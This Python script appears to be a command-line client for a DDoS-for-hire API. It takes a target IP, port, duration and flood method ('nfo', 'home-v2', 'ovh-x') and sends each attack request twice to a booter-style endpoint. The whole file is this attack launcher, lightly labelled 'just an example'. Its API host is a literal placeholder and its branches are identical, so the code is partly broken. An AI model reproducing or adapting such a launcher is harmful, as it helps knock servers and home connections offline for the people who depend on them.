import requests
import sys
import os
#this is just an example nothing big 
ip = sys.argv[1]
port = int((sys.argv[2]))
time = int((sys.argv[3]))
method = sys.argv[4]
def main():
	if method == "nfo":
		url = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
		url2 = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
		requests.get(url)
		requests.get(url2)
	elif method == "home-v2":
		url = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
		url2 = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
		requests.get(url)
		requests.get(url2) 
	elif method == "ovh-x":
		url = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
		url2 = f"http://ip/?api&host={ip}&port={port}&time={time}&method={method}"
		requests.get(url)
		requests.get(url2)



main()

